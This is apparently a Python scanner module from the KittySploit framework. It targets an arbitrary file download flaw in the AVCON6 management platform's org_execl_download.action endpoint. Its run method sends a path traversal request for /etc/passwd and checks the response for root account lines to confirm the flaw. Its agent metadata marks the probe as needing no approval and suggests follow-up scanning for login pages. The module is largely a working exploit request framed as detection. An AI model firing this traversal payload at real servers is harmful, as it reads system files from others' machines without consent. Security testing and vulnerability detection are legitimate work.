#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Arbitrary File Download vulnerability in the org_execl_download."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'AVCON6 org_execl_download.action - Arbitrary File Download Detection',
        'description': 'Arbitrary File Download vulnerability in the org_execl_download.action of the AVCON6 system management platform, through which an attacker can download arbitrary files from the server',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'avcon6', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/AVCON6%20%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20org_execl_download.action%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/org_execl_download.action?filename=../../../../../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_all = ('application/octet-stream', 'filename=',)
        body_regexes = ('root:.*:0:0:',)
        if (all(m in headers for m in header_all)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="AVCON6 org_execl_download.action - Arbitrary File Download detected",
                path='/org_execl_download.action?filename=../../../../../../../../../../../../../etc/passwd',
            )
            return True
        return False

